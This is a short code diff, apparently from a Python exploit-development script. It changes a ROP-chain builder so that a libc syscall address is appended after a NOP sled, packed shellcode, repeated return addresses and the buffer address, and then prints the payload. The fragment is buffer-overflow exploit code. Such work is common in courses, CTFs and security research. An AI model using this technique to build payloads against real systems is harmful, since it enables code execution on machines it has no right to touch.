@@ -339,10 +339,12 @@ def build_rop_chain_libc_syscalls(entry):
 
     rop_payload += 3 * dec_eax_addr
 
+    syscall_addr = pack_value(entry[1] + find_syscall(entry[0]))
+
     nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
     nop_sled = "\x90" * nop_len
 
-    rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload + pack_value(buf_address)
+    rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload + pack_value(buf_address) + syscall_addr
 
     print_rop_payload(rop_payload) 
 
